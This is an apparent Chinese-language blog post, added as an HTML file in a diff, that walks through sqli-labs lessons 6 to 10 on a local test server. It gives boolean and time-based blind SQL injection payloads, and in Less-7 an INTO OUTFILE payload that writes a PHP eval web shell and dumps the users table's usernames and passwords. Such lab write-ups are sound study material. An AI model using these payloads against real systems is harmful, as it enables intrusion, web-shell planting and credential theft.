@@ -1,0 +1,206 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>The rest of life</title>
+
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Learn,"> 
+    <meta name="description" content="Less-16- Blind- Time Based- Double quotes- String1.初步判断uname=admin&amp;amp;passwd=admin&amp;amp;submit=Subm,"> 
+    <meta name="author" content="lI"> 
+    <link rel="alternative" href="atom.xml" title="The rest of life" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+</head>
+
+<body class="loading">
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">Less 6-10</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Less 6-10</h1>
+        <div class="stuff">
+            <span>九月 13, 2018</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/GET传参/">GET传参</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/盲注/">盲注</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="Less-6-Double-Query-Double-Quotes-String"><a href="#Less-6-Double-Query-Double-Quotes-String" class="headerlink" title="Less-6 Double Query- Double Quotes- String"></a><strong>Less-6 Double Query- Double Quotes- String</strong></h1><h3 id="1-初步判断"><a href="#1-初步判断" class="headerlink" title="1.初步判断"></a>1.初步判断</h3><p><code>http://127.0.0.1/Less-6/?id=1</code><br>有返回，get传参<br><code>http://127.0.0.1/Less-6/?id=1&#39;</code><br>有返回，get传参<br><code>http://127.0.0.1/Less-6/?id=1&#39;&quot;</code><br>无返回,有sql报错，证明有sql报错返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;1&apos;&quot;&quot; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure></p>
+<p>根据sql报错语句推断出$id是被双引号包裹，sql里语句是”$id”   </p>
+<h3 id="2-查找注入点"><a href="#2-查找注入点" class="headerlink" title="2.查找注入点"></a>2.查找注入点</h3><p>根据1=1和1=2<br><code>http://127.0.0.1/Less-6/?id=1&quot; and 1=&quot;1</code><br>有返回<br><code>http://127.0.0.1/Less-6/?id=1&quot; and 1=&quot;2</code><br>无返回，证明有注入点   </p>
+<h3 id="3-获取数据"><a href="#3-获取数据" class="headerlink" title="3.获取数据"></a>3.获取数据</h3><h4 id="布尔盲注法"><a href="#布尔盲注法" class="headerlink" title="布尔盲注法"></a>布尔盲注法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-6/?id=1&quot; and length(database())=8 --+</span><br><span class="line">//判断库名长度是否等于8，是有返回成功，否无返回http://127.0.0.1/Less-6/?id=1&quot; and mid(database(),1,1)=&apos;s&apos; --+//判断库名首字母是否是S，是有返回成功，否无返回，最终猜得库名是 security http://127.0.0.1/Less-6/?id=1&quot; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101 --+//根据库名猜测第一个表名</span><br></pre></td></tr></table></figure>
+<p><strong> 小记：字符串 双引号 盲注</strong></p>
+<h1 id="Less-7-Dump-into-Outfile"><a href="#Less-7-Dump-into-Outfile" class="headerlink" title="Less-7 Dump into Outfile"></a><strong>Less-7 Dump into Outfile</strong></h1><h3 id="1-初步判断-1"><a href="#1-初步判断-1" class="headerlink" title="1.初步判断"></a>1.初步判断</h3><p><code>http://127.0.0.1/Less-7/?id=1</code><br>有返回值，get传参<br><code>http://127.0.0.1/Less-7/?id=1&#39;</code><br>有返回值，返回一句话你的sql语法有错误，知道无sql报错返回<br>无法通过sql报错知道格式，只能尝试<br><code>http://127.0.0.1/Less-7/?id=1&#39;)) --+</code><br>经过几次尝试，发先应该是((‘id’))这种格式可以闭合</p>
+<h3 id="2-查找注入点-1"><a href="#2-查找注入点-1" class="headerlink" title="2.查找注入点"></a>2.查找注入点</h3><p><code>http://127.0.0.1/Less-7/?id=1&#39;))and% 1=((&#39;1</code><br>正常显示<br><code>http://127.0.0.1/Less-7/?id=1&#39;))and% 1=((&#39;2</code><br>报错sql格式不正确，可是格式没问题所以判断这里是注入点   </p>
+<h3 id="3-获取数据-1"><a href="#3-获取数据-1" class="headerlink" title="3.获取数据"></a>3.获取数据</h3><p>因为，无返回值，无报错，所以无法通过返回来确定sql信息所以通过将信息写在文件目录里来查看信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-7/?id=100&apos;)) union select 1,&apos;&lt;?php @eval&#123;$_POST[]&#125;;?&gt;&apos;,3  into outfile &apos;C:\\4.php&apos; --+</span><br><span class="line">//测试的</span><br><span class="line">http://127.0.0.1/Less-7/?id=100&apos;)) union select username,&apos;~~&apos;,password from users into outfile  &quot;C:\\4.txt&quot; --+</span><br><span class="line">//显示users表用户名密码</span><br></pre></td></tr></table></figure></p>
+<p><strong> 小记：转储文件</strong></p>
+<h1 id="Less-8-Blind-Boolian-Single-Quotes-String"><a href="#Less-8-Blind-Boolian-Single-Quotes-String" class="headerlink" title="Less-8 Blind- Boolian- Single Quotes- String"></a><strong>Less-8 Blind- Boolian- Single Quotes- String</strong></h1><h3 id="1-初步判断-2"><a href="#1-初步判断-2" class="headerlink" title="1.初步判断"></a>1.初步判断</h3><p><code>http://127.0.0.1/Less-8/?id=1</code><br>有返回值，get传参 返回值一句话<br><code>http://127.0.0.1/Less-8/?id=1&#39;</code><br>无返回值，无报错，所以只能猜将输入闭合<br><code>http://127.0.0.1/Less-8/?id=1&#39; --+</code><br>又有回显，初步证明输入是被单引号包裹’$id’   </p>
+<h3 id="2-查找注入点-2"><a href="#2-查找注入点-2" class="headerlink" title="2.查找注入点"></a>2.查找注入点</h3><p><code>http://127.0.0.1/Less-8/?id=1&#39; and 1=&#39;1</code><br>返回一句话<br><code>http://127.0.0.1/Less-8/?id=1&#39; and 1=&#39;2</code><br>无返回，初步判断这里有注入点  </p>
+<h3 id="3-获取数据-2"><a href="#3-获取数据-2" class="headerlink" title="3.获取数据"></a>3.获取数据</h3><p>因为除了对错什么都判断不出来，所以考虑使用布尔盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-8/?id=1&apos; and length(database())=8 --+</span><br><span class="line">//判断库名长度是否等于8，是有返回成功，否无返回</span><br><span class="line">http://127.0.0.1/Less-6/?id=1&apos; and mid(database(),1,1)=&apos;s&apos; --+</span><br><span class="line">//判断库名首字母是否是S，是有返回成功，否无返回，最终猜得库名是 security </span><br><span class="line">http://127.0.0.1/Less-6/?id=1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101 --+</span><br><span class="line">//根据库名猜测第一个表名</span><br></pre></td></tr></table></figure></p>
+<p><strong> 小记：布尔判断</strong></p>
+<h1 id="Less-9-Blind-Time-based-Single-Quotes-String"><a href="#Less-9-Blind-Time-based-Single-Quotes-String" class="headerlink" title="Less-9 Blind- Time based- Single Quotes- String"></a><strong>Less-9 Blind- Time based- Single Quotes- String</strong></h1><h3 id="1-初步判断-3"><a href="#1-初步判断-3" class="headerlink" title="1.初步判断"></a>1.初步判断</h3><p><code>http://127.0.0.1/Less-9/?id=1</code><br>有返回值，get传参 返回值一句话   </p>
+<pre><code>http://127.0.0.1/Less-9/?id:1
+http://127.0.0.1/Less-9/?id:1&apos;
+http://127.0.0.1/Less-9/?id:1&apos;&quot;
+http://127.0.0.1/Less-9/?id:1&apos;&quot;&apos;
+http://127.0.0.1/Less-9/?id:1)
+http://127.0.0.1/Less-9/?id:1&apos;)
+http://127.0.0.1/Less-9/?id:1&quot;)
+http://127.0.0.1/Less-9/?id:1&quot;);
+http://127.0.0.1/Less-9/?id:1&quot;)&quot;
+http://127.0.0.1/Less-9/?id:1&quot;)&apos;&quot;
+http://127.0.0.1/Less-9/?id:1&quot;))
+</code></pre><p>全部无报错，且全有返回，盲注，单纯的布尔无法判断了  </p>
+<h3 id="2-查找注入点-3"><a href="#2-查找注入点-3" class="headerlink" title="2.查找注入点"></a>2.查找注入点</h3><p>全部无报错，且全有返回，无法通过返回值找到注入点  </p>
+<h3 id="3-获取数据-3"><a href="#3-获取数据-3" class="headerlink" title="3.获取数据"></a>3.获取数据</h3><p><strong>sql盲注延时注入</strong><br><code></code> <code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))
+//if判断语句，条件为假，执行sleep</code> <code></code><br>sleep的干扰因素比较多，比如网络拥堵之类的，不是直连会有一定干扰   </p>
+<pre><code>http://127.0.0.1/Less-9/?id=1&apos;+and+if(1=1, sleep(10), null)+ --+
+//and前面是正确的会停留10秒
+http://127.0.0.1/Less-9/?id=1&apos; and (length(database())) = 8 +and+if(1=1, sleep(10), null)+ --+
+//判断库名长度等于八会停留10秒
+http://127.0.0.1/Less-9/?id=1&apos; and (ascii(substr((select database()) ,1,1))) = 115 +and+if(1=1, sleep(10), null)+ --+
+//判断库名首字母ascii码是不是等于115 字母 S 是就等待10秒
+</code></pre><p><strong> 小记：延时注入</strong></p>
+<h1 id="Less-10-Blind-Time-based-Double-Quotes-String"><a href="#Less-10-Blind-Time-based-Double-Quotes-String" class="headerlink" title="Less-10 Blind- Time based- Double Quotes- String"></a><strong>Less-10 Blind- Time based- Double Quotes- String</strong></h1><h3 id="1-初步判断-4"><a href="#1-初步判断-4" class="headerlink" title="1.初步判断"></a>1.初步判断</h3><p><code>http://127.0.0.1/Less-10/?id=1</code><br>有返回值，get传参 返回值一句话   </p>
+<pre><code>http://127.0.0.1/Less-10/?id:1
+http://127.0.0.1/Less-10/?id:1&apos;
+http://127.0.0.1/Less-10/?id:1&apos;&quot;
+http://127.0.0.1/Less-10/?id:1&apos;&quot;&apos;
+http://127.0.0.1/Less-10/?id:1)
+http://127.0.0.1/Less-10?id:1&apos;)
+http://127.0.0.1/Less-10/?id:1&quot;)
+http://127.0.0.1/Less-10/?id:1&quot;);
+http://127.0.0.1/Less-10/?id:1&quot;)&quot;
+http://127.0.0.1/Less-10/?id:1&quot;)&apos;&quot;
+http://127.0.0.1/Less-10/?id:1&quot;))
+</code></pre><p>全部无报错，且全有返回，盲注，单纯的布尔无法判断了   </p>
+<h3 id="2-查找注入点-4"><a href="#2-查找注入点-4" class="headerlink" title="2.查找注入点"></a>2.查找注入点</h3><p>无法判断只能通过延时来判断是否闭合  </p>
+<h3 id="3-获取数据-4"><a href="#3-获取数据-4" class="headerlink" title="3.获取数据"></a>3.获取数据</h3><p><code>http://127.0.0.1/Less-10/?id:1&#39; and (length(database())) = 8 +and+if(1=1, sleep(10), null)+ --+</code><br>返应快，应该是未闭合and前面判断错误<br><code>http://127.0.0.1/Less-10/?id:1&quot; and (length(database())) = 8 +and+if(1=1, sleep(10), null)+ --+</code><br>这个对了<br>然后通过睡眠时间判断   </p>
+<pre><code>http://127.0.0.1/Less-10/?id=1&quot;+and+if(1=1, sleep(10), null)+ --+
+//and前面是正确的会停留10秒
+http://127.0.0.1/Less-10/?id=1&quot; and (length(database())) = 8 +and+if(1=1, sleep(10), null)+ --+
+//判断库名长度等于八会停留10秒
+http://127.0.0.1/Less-10/?id=1&quot; and (ascii(substr((select database()) ,1,1))) = 115 +and+if(1=1, sleep(10), null)+ --+
+//判断库名首字母ascii码是不是等于115 字母 S 是就等待10秒
+http://127.0.0.1/Less-10/?id=1&quot; and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 6 +and+if(1=1, sleep(1), null)+ --+
+//猜测表名
+</code></pre><p> <strong> 小记：延时注入 双引号</strong></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="http://music.163.com/song/media/outer/url?id=32341272">
+            </audio>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-6-Double-Query-Double-Quotes-String"><span class="toc-number">1.</span> <span class="toc-text">Less-6 Double Query- Double Quotes- String</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-初步判断"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.初步判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-查找注入点"><span class="toc-number">1.0.2.</span> <span class="toc-text">2.查找注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-获取数据"><span class="toc-number">1.0.3.</span> <span class="toc-text">3.获取数据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#布尔盲注法"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">布尔盲注法</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-7-Dump-into-Outfile"><span class="toc-number">2.</span> <span class="toc-text">Less-7 Dump into Outfile</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-初步判断-1"><span class="toc-number">2.0.1.</span> <span class="toc-text">1.初步判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-查找注入点-1"><span class="toc-number">2.0.2.</span> <span class="toc-text">2.查找注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-获取数据-1"><span class="toc-number">2.0.3.</span> <span class="toc-text">3.获取数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-8-Blind-Boolian-Single-Quotes-String"><span class="toc-number">3.</span> <span class="toc-text">Less-8 Blind- Boolian- Single Quotes- String</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-初步判断-2"><span class="toc-number">3.0.1.</span> <span class="toc-text">1.初步判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-查找注入点-2"><span class="toc-number">3.0.2.</span> <span class="toc-text">2.查找注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-获取数据-2"><span class="toc-number">3.0.3.</span> <span class="toc-text">3.获取数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-9-Blind-Time-based-Single-Quotes-String"><span class="toc-number">4.</span> <span class="toc-text">Less-9 Blind- Time based- Single Quotes- String</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-初步判断-3"><span class="toc-number">4.0.1.</span> <span class="toc-text">1.初步判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-查找注入点-3"><span class="toc-number">4.0.2.</span> <span class="toc-text">2.查找注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-获取数据-3"><span class="toc-number">4.0.3.</span> <span class="toc-text">3.获取数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-10-Blind-Time-based-Double-Quotes-String"><span class="toc-number">5.</span> <span class="toc-text">Less-10 Blind- Time based- Double Quotes- String</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-初步判断-4"><span class="toc-number">5.0.1.</span> <span class="toc-text">1.初步判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-查找注入点-4"><span class="toc-number">5.0.2.</span> <span class="toc-text">2.查找注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-获取数据-4"><span class="toc-number">5.0.3.</span> <span class="toc-text">3.获取数据</span></a></li></ol></li></ol></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
